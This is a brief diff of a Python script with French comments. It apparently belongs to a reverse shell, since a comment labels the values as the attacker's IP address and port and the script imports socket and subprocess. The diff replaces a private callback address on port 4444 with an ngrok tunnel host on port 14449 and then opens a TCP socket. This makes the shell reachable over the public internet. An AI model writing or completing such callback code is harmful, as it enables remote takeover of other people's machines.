@@ -3,8 +3,8 @@ import subprocess
 import os
 
 # Définissez l'adresse IP et le port de l'attaquant
-HOST = '10.186.0.68'
-PORT = 4444
+HOST = '4.tcp.eu.ngrok.io'
+PORT = 14449
 
 # Créez un objet socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
